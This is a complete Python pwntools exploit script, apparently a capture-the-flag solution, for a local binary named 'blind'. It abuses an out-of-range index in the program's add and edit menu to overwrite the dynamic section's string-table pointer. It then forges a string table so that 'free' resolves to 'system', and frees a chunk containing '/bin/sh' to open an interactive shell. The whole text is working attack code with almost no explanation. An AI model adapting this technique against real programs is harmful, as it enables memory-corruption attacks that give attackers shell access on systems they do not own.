from pwn import *
sh=process('./blind')
context.log_level='debug'

name_addr=0x6012c0
dt_strtab_addr=0x601098+0x8
offset=dt_strtab_addr-name_addr
offset/=0x8

free_addr=0x400499
dynstr_addr=0x400420
payload='\x00'*(free_addr-dynstr_addr)+'system'+'\x00'

def add(ofst,content):
    sh.sendlineafter('>','1')
    sh.sendlineafter('index:',str(ofst))
    sh.sendlineafter('name:',content)

def delete(index):
    sh.sendlineafter('>','2')
    sh.sendlineafter('index:',str(index))

def edit(ofst,content):
    sh.sendlineafter('>','3')
    sh.sendlineafter('index:',str(ofst))
    sh.sendlineafter('name:',content)

pause()
add(offset,'aaaa')
#len(payload)>0x80
edit(offset,payload)
add('0','/bin/sh\x00')
delete(0)

sh.interactive()
sh.close()